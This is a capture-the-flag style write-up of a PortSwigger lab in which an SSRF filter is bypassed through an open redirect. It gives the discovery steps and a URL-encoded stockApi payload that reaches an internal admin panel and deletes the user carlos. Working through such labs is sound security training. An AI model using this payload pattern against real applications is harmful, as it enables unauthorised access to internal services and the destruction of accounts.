# SSRF with filter bypass via open redirection vulnerability

> **Vulnerability Type:** SSRF
> **Lab URL:** [SSRF Lab](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)

---

## Objective  
Change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user "carlos"

---

## Setup  
- **Tools Used:** Burp Suite  
- **Environment Details:** PortSwigger Lab  

---

## Methodology  

### 1. **Discovery**  
- **Initial Observations:**  
  - Clicked on a product, saw `resources/js/stockCheckPayload.js`, `resources/js/stockCheck.js`, and found the `stockAPI` parameter in the HTTP request when I pressed the check stock button.
- **Testing Approach:**  
  - Find a redirection (lab is an open redirection vulnerability), find `/product/nextProduct?currentProductId=1&path=/product?productId=2` notice the `stockApi` reads as `/product/stock/check?productId=1&storeId=1` unencoded.  
    Craft a payload to redirect the `stockApi` to the admin panel `%2fproduct%2fnextProduct%3fpath%3dhttp%3a%2f%2f192.168.0.12%3a8080%2fadmin`.  
    Find the delete carlos href `/delete?username=carlos`, delete carlos and complete the lab.

### 2. **Exploitation**  
- **Payload Used:**  
  ```SSRF
  %2fproduct%2fnextProduct%3fpath%3dhttp%3a%2f%2f192.168.0.12%3a8080%2fadmin%2fdelete%3fusername%3dcarlos
  ```
### 3. **Screenshot**
Admin panel HTTP request with the href to delete the user "carlos" highlighted.
![Screenshot 2025-03-05 142811](https://github.com/user-attachments/assets/40ae39d0-9b5f-48e2-903f-f64efdeb700f)
